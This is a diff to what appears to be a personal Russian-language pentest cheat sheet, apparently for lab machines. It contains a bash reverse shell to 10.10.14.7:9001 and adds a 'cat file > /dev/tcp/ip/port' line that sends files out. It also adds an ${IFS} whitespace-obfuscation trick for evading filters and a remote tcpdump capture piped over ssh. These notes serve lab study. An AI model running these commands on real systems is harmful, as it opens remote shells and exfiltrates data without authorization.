@@ -8,7 +8,7 @@ class Program
     }
 }
 
-# Размер директорий с содержимым
+# Размер директорий с содержимым Linux
 
 du -hs *
 
@@ -103,8 +103,16 @@ cifs - Common Internet File System
 # Обратная оболочка bash
 
     bash -i >& /dev/tcp/10.10.14.7/9001 0>&1 
+    
+    cat file > /dev/tcp/ip/port
+    
 # ПРослушивание через tcpdump и передача в wireshark
 
 ssh 10.10.14.7@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22'" | wireshark -k -i -
 
 (laba - light)
+
+
+# Обфускация пробелов 
+
+echo “${IFS}test”
